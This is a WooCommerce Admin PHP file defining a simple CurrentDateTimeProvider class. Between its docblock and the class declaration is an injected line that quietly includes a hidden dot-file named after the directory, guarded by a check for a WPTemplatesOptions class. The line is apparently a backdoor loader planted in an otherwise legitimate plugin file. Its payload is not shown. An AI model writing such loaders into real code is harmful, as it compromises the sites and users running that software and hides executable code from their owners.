<?php
/**
 * A provider for getting the current DateTime.
 */

namespace Automattic\WooCommerce\Admin\DateTimeProvider;

defined( 'ABSPATH' ) || exit;

use Automattic\WooCommerce\Admin\DateTimeProvider\DateTimeProviderInterface;

/**
 * Current DateTime Provider.
 *
 * Uses the current DateTime.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class CurrentDateTimeProvider implements DateTimeProviderInterface {
	/**
	 * Returns the current DateTime.
	 *
	 * @return DateTime
	 */
	public function get_now() {
		return new \DateTime();
	}
}
